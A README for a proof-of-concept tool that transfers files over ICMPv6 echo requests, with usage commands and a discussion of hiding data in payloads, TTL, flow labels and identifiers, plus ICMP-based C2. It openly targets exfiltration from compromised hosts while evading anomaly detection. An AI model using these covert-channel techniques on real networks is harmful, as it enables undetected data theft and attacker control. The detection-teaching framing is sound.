# ICMPUT
PoC for transferring files via ICMP Echo Request (alias Ping) packets. Currently this only supports Linux and [ICMP for IPv6](https://www.rfc-editor.org/rfc/rfc4443#section-4.1), but I may add to it in the future.

The discussion below goes into many aspects of this idea which are not implemented here. I may implement some of this stuff sporadically if I end up needing them in practise.

## Usage
This is just a prototype implementation with some - undesirable - properties, but feel free to play around it if you want. It likely will not brick your system, but I wouldn't let it run for hours on end.

### Sender
```bash
make bin/icmput
./icmput -f <filepath> -d <destination Ip or domain>`
```

### Receiver
```bash
# you can check the incoming data e.g. with tcpdump
tcpdump -X 'icmp6[0]==128' # 128 are ICMP6 echo requests, 129 would be replies

# this repo comes with a prototype receiver which starts writing a new file
# for every echo request identifier
# it is based on libpcap and assigns the relevant permissions during make,
# such that sudo is not required for running the server
make bin/icmput_server
./bin/icmput_server <interface>
```

## But why?
TL;DR: Security pracitioners may inspect TCP/UDP traffic thoroughly but not really check ICMP. Also misconfigured firewalls may block suspicious TCP/UDP traffic but generously let all outgoing ICMP traffic pass. How else would they debug network issues if they couldn't ping google.com?

### Background
This is just a little experiment of mine which was born from an observation I made when working for Cyber Security/Blue Teaming Courses for Traffic Analysis:
These courses often suggest something like *"To detect malicious traffic like data theft, payload upload and C2 traffic, we have to look for anomalies in TCP and UDP network traffic"*. But guess what, not all traffic is [TCP](https://www.ietf.org/rfc/rfc9293.html) or [UDP](https://www.rfc-editor.org/rfc/rfc768). Another common protocol is Internet Control Message Protocol ([ICMP](https://www.rfc-editor.org/rfc/rfc792) and [ICMP6](https://www.rfc-editor.org/rfc/rfc4443)).

As the name suggests, ICMP is intended as a supporting protocol. RFC792 states:
*ICMP messages are sent in several situations:  for example, when a datagram cannot reach its destination, when the gateway does not have the buffering capacity to forward a datagram, and when the gateway can direct the host to send traffic on a shorter route.*

The most common case where end users *intentionally* send ICMP messages is when they ping a network-connected host for diagnosis, e.g. `ping www.google.com`. `ping` is just a utility to send/receive so called *ICMP Echo Requests/Replies* and print the relevant statistics.

### The Idea
The theoretical idea behind **Information Security** is that no unauthorized [Information Flow](https://dl.acm.org/doi/pdf/10.1145/360051.360056) is possible, i.e. that confidential information may not flow to any unauthorized sink. In a strict but more practical sense, this means that confidential information may not influence the *publically* (i.e. by outsiders) observable behavior in any way, at least not in a way which allows outsiders to draw conclusions about confidential information. Despite not being discussed in many traffic analysis courses, ICMP messages can be send in a (semi-)controlled manner if an attacker compromises a victim system, allowing to establish an uni- or bidirectional information flow between the victim system and the attackers machine.


### Options for transferring data via ICMP Echo Requests
Just for fun, lets first assume that we as adversaries couldn't control the packet contents and headers at all. In this case we could still transfer data like this:
- Using a fixed interval, either send (x==1) or not send (x==0) data based on a secret bit x (this would be extremely slow, even at 10 packets per second)
- Modulate the packet frequency to build some kind of morse code

But this is just hypothetical. In practise, ICMP Echo Requests have plenty opportunities to embed data which are unused by casual `ping` users:
- Most obviously, ICMP packets have a variable-length **data** field which we can fill as we want. However, this may be picked up by anomaly detection as e.g. the default ping utilities usually fill the data field with a fixed pattern
- **TTL/Hop Limit** (IP header): While the exact number of hops is not fixed (due to packet-switched delivery), we can modulate these values in increments to transfer information (again, may be picked up by anomaly detection)
- **IPv6 Flow Label**: This 20-bit value is interesting as it is usually randomly chosen by the kernel unless explicitly set. You know what else looks (almost) exactly like random data? Encrypted data! By setting the flow label to 20 bit of encrypted data each time without touching the data field, we look exactly like normal ping activity.
- **Identifier**: Similar to flow label, but part of the ICMP header instead of the IP header

Unfortunately, not all of these are available to us if we do not have elevated privileges on the victim machine. If we use sockets of type `SOCK_DGRAM` (works unprivileged) instead of `SOCK_RAW`, the kernel e.g. e.g. might set its own identifier value in the ICMP header. Nevertheless, even if we needed root privileges, the ability to send data via ICMP itself is already pretty neat.

### C2 via ICMP
Obfuscation of Command and Control (C2) traffic is nothing new. For example, a common strategy is to issue DNS requests from a victim host and encode the C2 servers reply in the DNS response. This is why many courses teach SoC and Blue Teamers to also have a stern look at DNS traffic (which is mostly port 53 UDP). C2 via ICMP is also possible: Just store whatever your C2 server shall send to the victim in the ICMP Echo Reply. This can be fiddly on some server OSes as the kernel very much wants to handle ICMP traffic itself. On Linux you can e.g. control this with `/proc/sys/net/ipv[4|6]/icmp/echo_ignore_all`.
